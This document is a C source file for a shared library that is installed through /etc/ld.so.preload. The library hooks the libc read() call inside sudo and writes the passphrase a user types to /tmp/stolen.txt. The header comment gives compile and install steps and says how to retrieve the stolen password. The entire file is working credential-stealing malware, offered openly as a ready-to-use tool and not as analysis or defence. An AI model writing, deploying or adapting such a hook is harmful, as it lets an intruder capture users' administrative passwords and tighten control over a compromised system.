/*
 *                 -- oxagast / Marshall Whittaker --
 * Compile using: gcc -fPIC -shared -ldl sudo_lib_hook.c -o /tmp/cap_pass.so
 * Then add /tmp/cap_pass.so to /etc/ld.so.preload (you'll need to do this as
 * root). Then sudo su.  Log back out of the shell and check /tmp/stolen.txt.
 *
 *  /tmp/stolen.txt should now contain the passphrase you entered.
 *
 */


// GNU SOURCE needed for RTLD_NEXT as not
// in standard dynamic link lib
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

long getfsize(const char* fn) {
    // we should open in binmode for read
    FILE *file = fopen(fn, "rb");
    if (file == NULL) {
        perror("Error opening: /tmp/stolen.txt");
        return -1;
    }
    // move file's pointer to last byte
    fseek(file, 0, SEEK_END);
    // pull current pos
    long fsz = ftell(file);
    fclose(file);
    // ret file size as long
    // we don't use unsigned to account for errs
    return fsz;
}

// pointer to real read func (needs to be PIC)
static ssize_t (*original_read)(int fd, void *buf, size_t count) = NULL;

ssize_t read(int fd, void *buf, size_t count) {
  char process_name[256];
  if (original_read == NULL) {
    // we need dlfcn.h / -ldl for RTLD_*
    original_read = dlsym(RTLD_NEXT, "read");
    if (original_read == NULL) {
      fprintf(stderr, "Error: Could not find original read function.\n");
      return -1;
    }
  }
  FILE *fp_comm = fopen("/proc/self/comm", "r");
  if (fp_comm) {
    fgets(process_name, sizeof(process_name), fp_comm);
    // null terminate without newln
    process_name[strcspn(process_name, "\n")] = '\0';
    // make sure we only read from sudo process
    if (strcmp(process_name, "sudo") == 0) {
      FILE *stealer;
      stealer = fopen("/tmp/stolen.txt", "a");
      // limit the file from growing
      if(getfsize("/tmp/stolen.txt") <= 200) {
        // limit string to 1 char per addition ( %.1s )
        if (count == 1) {
          fprintf(stealer, "%.1s", buf);
        }
      }
      else {
        // fallback to orig call
        return original_read(fd, buf, count);
      }
      // close our password cache
      fclose(stealer);
    }
    // close our sudo check fp
    fclose(fp_comm);
  } else {
    perror("Error opening /proc/self/comm");
  }
  // call orig to finish real read
  return original_read(fd, buf, count);
}
